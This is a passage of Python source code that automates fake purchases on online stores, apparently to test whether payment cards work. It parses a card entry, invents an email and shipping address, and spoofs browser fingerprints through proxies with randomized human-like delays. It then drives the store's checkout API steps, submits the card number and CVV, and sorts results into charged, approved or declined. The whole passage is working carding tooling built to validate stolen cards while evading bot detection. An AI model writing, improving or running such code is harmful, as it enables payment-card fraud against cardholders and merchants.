                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{"requestUrl": "{checkout_url}", "pageId": "{page_id}"}}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    currency = "USD"
    country = "US"
    parsed = urllib.parse.urlparse(shop_url)
    site_name = parsed.netloc or shop_url.replace("https://", "").replace("http://", "").split("/")[0]

    result = CheckResult(card=card_entry, shop_url=shop_url, site_name=site_name,
                         currency=currency, status=CheckStatus.ERROR)
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        result.severity = "error"
        return result

    email = generate_random_email()
    browser = random.choice(list(BROWSER_MAP.keys()))

    client = AsyncTLSClient(timeout=15, proxy_url=proxy_url, browser=browser)

    try:
        _timeout_ctx = asyncio.timeout(MAX_CHECKOUT_SECONDS)
    except AttributeError:
        import async_timeout
        _timeout_ctx = async_timeout.timeout(MAX_CHECKOUT_SECONDS)
    async with _timeout_ctx:
        try:
            try:
                title, product_id, product_handle, variant_id, price = await find_cheapest_product(
                    client, shop_url, MIN_PRODUCT_PRICE, MAX_PRODUCT_PRICE
                )
                _ = title
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.retryable = True
                result.error = Exception(f"Step 0 failed: {e}")
                result.step = "product_fetch"
                result.severity = "warning"
                return result

            try:
                checkout_url, checkout_token, session_token, checkout_html = await add_to_cart_and_checkout(
                    client, shop_url, variant_id
                )
                stable_id = extract_stable_id(checkout_html)
                build_id = extract_commit_sha(checkout_html)
                source_token = extract_source_token(checkout_html)
                if not stable_id or not build_id or not source_token:
                    raise Exception("missing stableId/buildId/sourceToken")
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.retryable = True
                result.error = Exception(f"Step 1 failed: {e}")
                result.step = "cart_checkout"
                result.severity = "warning"
                return result

            await _human_delay(200, 500)

            try:
                pat_id = extract_private_access_token_id(checkout_html)
                if not pat_id:
                    raise Exception("no private_access_token id")
                await fetch_private_access_token(client, shop_url, checkout_url, pat_id)
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.retryable = True
                result.error = Exception(f"Step 2 failed: {e}")
                result.step = "private_token"
                result.severity = "warning"
                return result

            await _human_delay(150, 400)

            try:
                js_urls = extract_all_checkout_js_urls(checkout_html, shop_url)
                if not js_urls:
                    raise Exception("no checkout JS URLs")
                proposal_id = submit_id = poll_for_receipt_id = ""
                for js_url in js_urls:
                    try:
                        js_body = await fetch_actions_js(client, js_url, shop_url)
                        pid, sid, poll = extract_ids_from_js(js_body)
                        if pid and sid:
                            proposal_id = pid
                            submit_id = sid
                            poll_for_receipt_id = poll or FALLBACK_POLL_ID
                            break
                    except Exception:
                        continue
                if not proposal_id or not submit_id:
                    raise Exception("no Proposal/Submit IDs found")
                if not poll_for_receipt_id:
                    poll_for_receipt_id = FALLBACK_POLL_ID
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.retryable = True
                result.error = Exception(f"Step 3 failed: {e}")
                result.step = "graphql_ids"
                result.severity = "warning"
                return result

            await _human_delay(300, 700)

            try:
                _, proposal_body = await send_proposal(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    currency, country)
                cur = extract_seller_currency(proposal_body)
                if cur and cur != currency:
                    currency = cur
                if not cur:
                    cur = extract_currency_from_checkout(checkout_html)
                    if cur:
                        currency = cur
                ctr = extract_seller_country(proposal_body)
                if ctr and ctr != country:
                    country = ctr
                result.currency = currency
                if currency == "USD":
                    sp = extract_seller_merchandise_price(proposal_body)
                    if sp and sp != price:
                        price = sp
                queue_token = extract_queue_token(proposal_body)
                if not queue_token:
                    raise Exception("no queueToken")
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"Step 4 failed: {e}")
                result.step = "proposal_1"
                result.severity = "warning"
                return result

            await _human_delay(200, 500)

            try:
                _, proposal2_body = await send_proposal2(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    queue_token, email, currency, country)
                queue_token2 = extract_queue_token(proposal2_body)
                if not queue_token2:
                    raise Exception("no queueToken")
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"Step 5 failed: {e}")
                result.step = "proposal_2"
                result.severity = "warning"
                return result

            try:
                addr_country = country
                if country not in ADDRESSES_BY_COUNTRY:
                    addr_country = CURRENCY_TO_COUNTRY.get(currency, country)
                addr = address_for_country(addr_country)
                _, proposal3_body = await send_proposal3(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    queue_token2, email, addr, currency, country)
                queue_token3 = extract_queue_token(proposal3_body)
                if not queue_token3:
                    raise Exception("no queueToken")
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"Step 6 failed: {e}")
                result.step = "proposal_3"
                result.severity = "warning"
                return result

            try:
                _, proposal4_body = await send_proposal3(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    queue_token3, email, addr, currency, country)
                queue_token4 = extract_queue_token(proposal4_body)
                if not queue_token4:
                    raise Exception("no queueToken")
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"Step 7 failed: {e}")
                result.step = "proposal_4"
                result.severity = "warning"
                return result

            try:
                _, proposal5_body = await send_proposal3(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    queue_token4, email, addr, currency, country)
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"Step 8 failed: {e}")
                result.step = "proposal_5"
                result.severity = "warning"
                return result

            try:
                gateways = extract_payment_gateways(proposal5_body)
                if gateways:
                    for gw in gateways:
                        if gw.get("typename") == "PaymentProvider":
                            result.gateway = gw.get("display") or gw.get("name") or ""
                            break
                    if not result.gateway:
                        result.gateway = gateways[0].get("display") or gateways[0].get("name") or ""
            except Exception:
                pass

            await _human_delay(300, 700)

            try:
                ident_sig = extract_identification_signature(checkout_html)
                if not ident_sig:
                    raise Exception("no identification signature")
                pci_status, pci_body = await send_pci_session(
                    client, ident_sig, card_number,
                    f"{addr.first_name} {addr.last_name}",
                    card_month, card_year, card_cvv, site_name, proxy_url)
                _ = pci_status
                pci_session_id = extract_pci_session_id(pci_body)
                if not pci_session_id:
                    raise Exception("no PCI session ID")
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"Step 9 failed: {e}")
                result.step = "pci_session"
                result.severity = "warning"
                return result

            await _human_delay(200, 500)

            try:
                queue_token5 = extract_queue_token(proposal5_body)
                if not queue_token5:
                    raise Exception("no queueToken")

                is_digital = not extract_is_shipping_required(proposal5_body)
                delivery_handle = extract_delivery_handle(proposal5_body)
                if not delivery_handle and not is_digital:
                    result.retryable = True
                    raise Exception("Step 10: no delivery handle")

                signed_handles = extract_signed_handles(proposal5_body)
                if len(signed_handles) == 0 and not is_digital:
                    result.retryable = True
                    raise Exception("Step 10: no signedHandles")

                shipping_amount = extract_shipping_amount(proposal5_body)
                if not shipping_amount and not is_digital:
                    result.retryable = True
                    raise Exception("Step 10: no shipping amount")
                if not shipping_amount:
                    shipping_amount = "0.00"

                total_amount = extract_checkout_total(proposal5_body)
                if not total_amount:
                    total_amount = extract_seller_total(proposal5_body)
                if not total_amount and is_digital:
                    total_amount = extract_running_total(proposal5_body)
                if not total_amount:
                    raise Exception("Step 10: no total amount")
                result.amount = total_amount

                current_tax = extract_tax_amount(proposal5_body)
                current_total = total_amount
                submit_body = ""

                for tax_attempt in range(1, TAX_RETRY_LIMIT + 1):
                    attempt_token = generate_attempt_token(checkout_token)
                    submit_status, submit_body = await send_submit_for_completion(
                        client, shop_url, checkout_url, checkout_token, session_token,
                        stable_id, variant_id, price, submit_id, build_id, source_token,
                        queue_token5, email, addr, delivery_handle, shipping_amount,
                        current_total, pci_session_id, attempt_token, currency, country,
                        signed_handles, is_digital=is_digital, tax_amount=current_tax)
                    if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                        new_tax = extract_tax_from_rejected(submit_body)
                        new_total = extract_total_from_rejected(submit_body)
                        if new_tax:
                            current_tax = new_tax
                        if new_total:
                            current_total = new_total
                        await asyncio.sleep(0.1)
                        continue
                    break
                _ = submit_status

                receipt_id = extract_receipt_id(submit_body)
                if not receipt_id:
                    err = _extract_error_from_submit(submit_body)
                    if err.severity == "approved":
                        result.status = CheckStatus.APPROVED
                        result.status_code = err.label
                        result.response = err.best_message() or err.label
                        result.severity = "approved"
                        result.step = "submit_completion"
                        return result
                    if err.severity == "declined":
                        result.status = CheckStatus.DECLINED
                        result.status_code = err.label
                        result.response = err.best_message() or err.label
                        result.error = Exception(err.label)
                        result.severity = "declined"
                        result.step = "submit_completion"
                        return result
                    msg = err.message or err.code or "Step 10: no receiptId"
                    if "CAPTCHA" in msg:
                        msg = "CARD_DECLINED"
                    lower = msg.lower()
                    if any(k in lower for k in ("inventory", "retry", "try again", "generic", "system")):
                        result.status = CheckStatus.ERROR
                        result.retryable = True
                    else:
                        result.status = CheckStatus.DECLINED
                    result.status_code = msg
                    result.error = Exception(msg)
                    result.severity = err.severity
                    result.step = "submit_completion"
                    return result

                receipt_session_token = extract_receipt_session_token(submit_body)
                if not receipt_session_token:
                    raise Exception("Step 10: no receipt sessionToken")
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = e
                result.step = "receipt_creation"
                result.severity = "warning"
                return result

            poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')

            for poll_num in range(1, POLL_MAX_ATTEMPTS + 1):
                try:
                    _, poll_body = await send_poll_for_receipt(
                        client, shop_url, checkout_url, checkout_token, session_token,
                        build_id, source_token, poll_for_receipt_id,
                        receipt_id, receipt_session_token)

                    err = _extract_error_from_receipt(poll_body)
                    receipt_type = err.type

                    if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
                        result.status = CheckStatus.CHARGED
                        result.status_code = "ORDER_PLACED"
                        result.response = "ORDER_PLACED"
                        result.severity = "charged"
                        result.step = "poll_receipt"
                        receipt_link = extract_receipt_url(poll_body, shop_url)
                        result.receipt_url = receipt_link or shop_url
                        result.paid_site = shop_url
                        return result

                    if receipt_type == "ActionRequiredReceipt":
                        if err.code:
                            kind, label = _classify_code(err.code)
                        else:
                            kind, label = "approved", "3DS_REQUIRED"
                        result.status = CheckStatus.APPROVED
                        result.status_code = label if label else "3DS_REQUIRED"
                        result.response = err.best_message() or result.status_code
                        result.severity = "approved"
                        result.step = "poll_receipt"
                        return result

                    if receipt_type == "StagedReceipt":
                        # staged = still processing, keep polling
                        await asyncio.sleep(POLL_MIN_DELAY_MS / 1000.0)
                        continue

                    if receipt_type == "FailedReceipt":
                        kind, label = _classify_code(err.code)
                        result.response = err.best_message() or label or err.code
                        if kind == "approved":
                            result.status = CheckStatus.APPROVED
                            result.status_code = label
                            result.severity = "approved"
                        elif kind == "error":
                            result.status = CheckStatus.ERROR
                            result.status_code = label
                            result.retryable = True
                            result.severity = "warning"
                        else:
                            result.status = CheckStatus.DECLINED
                            result.status_code = label or "CARD_DECLINED"
                            result.error = Exception(result.status_code)
                            result.severity = "declined"
                        result.step = "poll_receipt"
                        return result

                    delay = 500
                    m2 = poll_delay_re.search(poll_body)
                    if m2:
                        try:
                            d = int(m2.group(1))
                            if d > 0:
                                delay = d
                        except ValueError:
                            pass
                    await asyncio.sleep(min(max(delay, POLL_MIN_DELAY_MS), POLL_MAX_DELAY_MS) / 1000.0)
                except Exception as e:
                    result.status = CheckStatus.ERROR
                    result.error = Exception(f"poll {poll_num} failed: {e}")
                    result.step = "poll_receipt"
                    result.severity = "warning"
                    return result

            result.status = CheckStatus.ERROR
            result.status_code = "PROCESSING"
            result.error = Exception("PROCESSING")
            result.retryable = True
            result.step = "poll_receipt"
            result.severity = "warning"
            return result
        finally:
            await client.close()